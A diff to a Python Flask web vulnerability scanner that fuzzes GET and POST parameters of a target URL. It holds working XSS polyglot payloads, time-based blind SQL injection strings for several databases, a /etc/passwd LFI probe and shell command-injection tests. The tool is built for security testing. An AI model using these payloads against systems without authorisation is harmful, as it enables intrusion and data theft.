@@ -13,7 +13,7 @@ firefox = Ghost()
 Description: inject a polyglot vector for XSS in every parameter, then it checks if an alert was triggered
 Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
 """
-def scan_xss(vulns, url, fuzz, cookie, useragent):
+def scan_xss(method, vulns, url, fuzz, cookie, useragent, firefox, data):
 	payload = 'jaVasCript:alert(1)//" name=alert(1) onErrOr=eval(name) src=1 autofocus oNfoCus=eval(name)><marquee><img src=x onerror=alert(1)></marquee>" ></textarea\></|\><details/open/ontoggle=prompt`1` ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->" ></script><sCrIpt>confirm(1)</scRipt>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>\'"><!--'
 	payload1 = 'javascript:/*-->]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=/alert(1)/.source]<img -/style=a:expression&#40&#47&#42\'/-/*&#39,/**/eval(name)/*%2A///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascript:eval(name)//>"'
 
@@ -41,7 +41,7 @@ def scan_xss(vulns, url, fuzz, cookie, useragent):
 Description: use a single quote to generate a SQL error in the page
 Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
 """
-def scan_sql_error(vulns, url, fuzz, cookie, useragent):
+def scan_sql_error(method, vulns, url, fuzz, cookie, useragent, data):
 	payload = "'"
 	inject  = url.replace(fuzz+"=", fuzz+"="+payload)
 	content = requests.get(inject, cookies=cookie, headers={'user-agent': useragent} ).text
@@ -58,7 +58,7 @@ def scan_sql_error(vulns, url, fuzz, cookie, useragent):
 Description: use a polyglot vector to detect a SQL injection based on the response time
 Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
 """
-def scan_sql_blind_time(vulns, url, fuzz, cookie, useragent):
+def scan_sql_blind_time(method, vulns, url, fuzz, cookie, useragent, data):
 	mysql_payload     = "SLEEP(4) /*' || SLEEP(4) || '\" || SLEEP(4) || \"*/"
 	sqlite_payload    = "substr(upper(hex(randomblob(55555555))),0,1) /*' || substr(upper(hex(randomblob(55555555))),0,1) || '\" || substr(upper(hex(randomblob(55555555))),0,1) || \"*/"
 	postgre_payload   = "(SELECT 55555555 FROM PG_SLEEP(4)) /*' || (SELECT 55555555 FROM PG_SLEEP(4)) || '\" || (SELECT 55555555 FROM PG_SLEEP(4)) || \"*/"
@@ -92,7 +92,7 @@ def scan_sql_blind_time(vulns, url, fuzz, cookie, useragent):
 Description: will scan every parameter for LFI, checking for the common root:x:0:0
 Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
 """
-def scan_lfi(vulns, url, fuzz, cookie, useragent):
+def scan_lfi(method, vulns, url, fuzz, cookie, useragent, data):
 	payload = "/etc/passwd"
 	inject  = re.sub(fuzz+"="+"(.[^&]*)", fuzz+"="+payload , url)
 	content = requests.get(inject, cookies=cookie, headers={'user-agent': useragent} ).text
@@ -109,7 +109,7 @@ def scan_lfi(vulns, url, fuzz, cookie, useragent):
 Description: use a polyglot vector to detect a RCE based on the response time
 Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
 """
-def scan_rce(vulns, url, fuzz, cookie, useragent):
+def scan_rce(method, vulns, url, fuzz, cookie, useragent, data):
 	""" Some tests of context
 	$ time (ping -c 3 127.0.0.1`#'|sleep${IFS}4|'`"|sleep${IFS}4|";sleep${IFS}4 )     -   real	0m4.113s
 	ping: unknown host 127.0.0.1|sleep 	
@@ -160,14 +160,18 @@ def index():
 	vulns = {'rce': 0, 'xss': 0, 'sql': 0, 'lfi': 0, 'list':''}
 	
 	# Parse requests - extract arguments
-	args      = request.args
-	url       = args['url']
-	useragent = args['useragent']
-	methods   = args['method']
-	data      = args['data']
-	
+	args          = request.args
+	url           = args['url']
+	useragent     = args['useragent']
+	methods       = args['method']
+	data          = args['data']
+	method        = ''
+	matches       = []
+	data_requests = {}
+
 	# Parse args for GET
 	if "?" in url:
+		method  = 'GET'
 
 		# Parse cookies strings - string like name:username|value:admin
 		cookies_requests = {}
@@ -182,22 +186,15 @@ def index():
 					cookies_requests[name] = value
 					cookies_ghost += " "+cookie.replace('name:','').replace('value:','=').replace('|','') + ";"
 
-		# Parse url	
+		# Parse GET data (in url)	
 		params  = url.split('?')[1]
 		regex   = re.compile('([a-zA-Z0-9\-_]*?)=')
 		matches = regex.findall(params)
 
-		# Launch scans
-		for fuzz in matches:
-			print "\n---[ GET - New parameter " + fuzz + " for url: " + url + " ]---"
-			scan_xss(vulns, url, fuzz, cookies_ghost, useragent)
-			scan_lfi(vulns, url, fuzz, cookies_requests, useragent)
-			scan_sql_error(vulns, url, fuzz, cookies_requests, useragent)
-			scan_sql_blind_time(vulns, url, fuzz, cookies_requests, useragent)
-			scan_rce(vulns, url, fuzz, cookies_requests, useragent)
 
 	# Parse args for POST
 	if data != '':
+		method = 'POST'
 
 		# Parse document.cookie for Ghost and Requests
 		cookies_requests = {} #dict
@@ -206,19 +203,35 @@ def index():
 			c = cookie.split('=')
 			if c != '' and c != None:
 				if len(c) != 1:
-					name = c[0]
+					name  = c[0]
 					value = c[1]
 					cookies_requests[name] = value
 					cookies_ghost += " "+cookie.replace('name:','').replace('value:','=').replace('|','') + ";"
 
-		# DEBUG
-		print cookies_requests
-		print cookies_ghost
 
-		# TODO parse POST data
-		fuzz = data
-		print "\n---[ POST - New parameter |" + fuzz + "| for url: " + url + " ]---"
+		# Parse POST data (in data parameter)
+		data_requests = {}
+		for post_data in data.split('|'):
+			d = post_data.split(':')
+			if d != '' and d != None:
+				if len(d) != 1:
+					name  = str(d[0])
+					value = str(d[1])
+					data_requests[name] = value
 
+		# Convert dict(data_requests) to list(matches)
+		matches = data_requests.keys()
+
+
+	# Launch scans - iterate through all parameters - handle data request ?
+	for fuzz in matches:
+		print "\n---[ " + method + " - New parameter " + fuzz + " for url: " + url + " ]---"
+		scan_xss(method, vulns, url, fuzz, cookies_ghost, useragent, firefox, data_requests)
+		scan_lfi(method, vulns, url, fuzz, cookies_requests, useragent, data_requests)
+		scan_sql_error(method, vulns, url, fuzz, cookies_requests, useragent, data_requests)
+		scan_sql_blind_time(method, vulns, url, fuzz, cookies_requests, useragent, data_requests)
+		scan_rce(method, vulns, url, fuzz, cookies_requests, useragent, data_requests)
+	
 
 	# Display results as a json
 	return jsonify(vulns)
